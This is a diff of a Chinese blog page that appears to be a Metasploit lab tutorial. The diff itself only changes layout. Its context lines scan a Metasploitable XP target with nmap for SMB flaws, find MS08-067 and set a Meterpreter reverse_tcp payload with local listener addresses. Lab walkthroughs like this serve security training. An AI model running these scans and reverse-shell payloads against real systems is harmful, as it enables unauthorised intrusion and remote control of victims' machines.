@@ -133,7 +133,7 @@
 <meta property="og:image" content="http://p1.bqimg.com/567571/bbc3e104976b7066.png">
 <meta property="og:image" content="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg">
 <meta property="og:image" content="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg">
-<meta property="og:updated_time" content="2016-12-08T02:05:05.904Z">
+<meta property="og:updated_time" content="2017-10-25T15:29:00.771Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于Metasploit的简单渗透测试">
 <meta name="twitter:description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
@@ -440,7 +440,7 @@
         <h3 id="0x00-Metasploitable"><a href="#0x00-Metasploitable" class="headerlink" title="0x00 Metasploitable"></a>0x00 Metasploitable</h3><p>Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。<br>本次测试使用xp系统的靶机，下载地址<br><a href="http://pan.baidu.com/s/1geMxsuJ" target="_blank" rel="external">http://pan.baidu.com/s/1geMxsuJ</a>  密码：xst1</p>
 <h3 id="0x01-查看详细信息"><a href="#0x01-查看详细信息" class="headerlink" title="0x01 查看详细信息"></a>0x01 查看详细信息</h3><p>使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：<br><a id="more"></a><br>    nmap -sT -A –script=smb-check-vulns -P0 192<br>    -sT 使用TCP Connect扫描<br>    -A 是指高级操作系统探测功能，对一个特定服务进行更深的旗标和指纹攫取<br>    –script=smb-check-vulns 调用smb-check-vulns脚本<br>    -P0 进行更深层次的扫描，不进行主机发现.168.0.146</p>
 <p><img src="http://p1.bpimg.com/567571/826753312810080e.png" alt=""><br><img src="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png" alt=""><br>发现探测出MS08-067漏洞，使用Metasploit进行攻击利用。</p>
-<h2 id="0x02-Metasploit的利用"><a href="#0x02-Metasploit的利用" class="headerlink" title="0x02 Metasploit的利用"></a>0x02 Metasploit的利用</h2><p>2.1 查找 MS08-067相关的模块<br><img src="http://p1.bpimg.com/567571/a638f3936515e739.png" alt=""></p>
+<h3 id="0x02-Metasploit的利用"><a href="#0x02-Metasploit的利用" class="headerlink" title="0x02 Metasploit的利用"></a>0x02 Metasploit的利用</h3><p>2.1 查找 MS08-067相关的模块<br><img src="http://p1.bpimg.com/567571/a638f3936515e739.png" alt=""></p>
 <p>2.2 使用选中的模块并查看<br><img src="http://p1.bpimg.com/567571/96be5eca3ce882a7.png" alt=""></p>
 <pre><code>set TARGET 5
 </code></pre><p>2.2 设置攻击参数<br>show options 查看一下参数，确保无误<br>设置PAYLOAD（攻击载荷）<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set RHOST 192.168.1.146 设置远程主机IP地址<br>set LHOST 192.168.1.179 设置反向连接地址为本机IP地址<br>set LPORT 55555 设置本机监听的TCP端口号<br>这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址。</p>
@@ -801,7 +801,7 @@ meterpreter &gt; migrate + 进程号
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Metasploitable"><span class="nav-number">1.</span> <span class="nav-text">0x00 Metasploitable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-查看详细信息"><span class="nav-number">2.</span> <span class="nav-text">0x01 查看详细信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Metasploit的利用"><span class="nav-number"></span> <span class="nav-text">0x02 Metasploit的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-提权"><span class="nav-number">1.</span> <span class="nav-text">0x03 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-补充知识"><span class="nav-number">2.</span> <span class="nav-text">0x04 补充知识</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Metasploitable"><span class="nav-number">1.</span> <span class="nav-text">0x00 Metasploitable</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-查看详细信息"><span class="nav-number">2.</span> <span class="nav-text">0x01 查看详细信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Metasploit的利用"><span class="nav-number">3.</span> <span class="nav-text">0x02 Metasploit的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-提权"><span class="nav-number">4.</span> <span class="nav-text">0x03 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-补充知识"><span class="nav-number">5.</span> <span class="nav-text">0x04 补充知识</span></a></li></ol></div>
             
 
           </div>
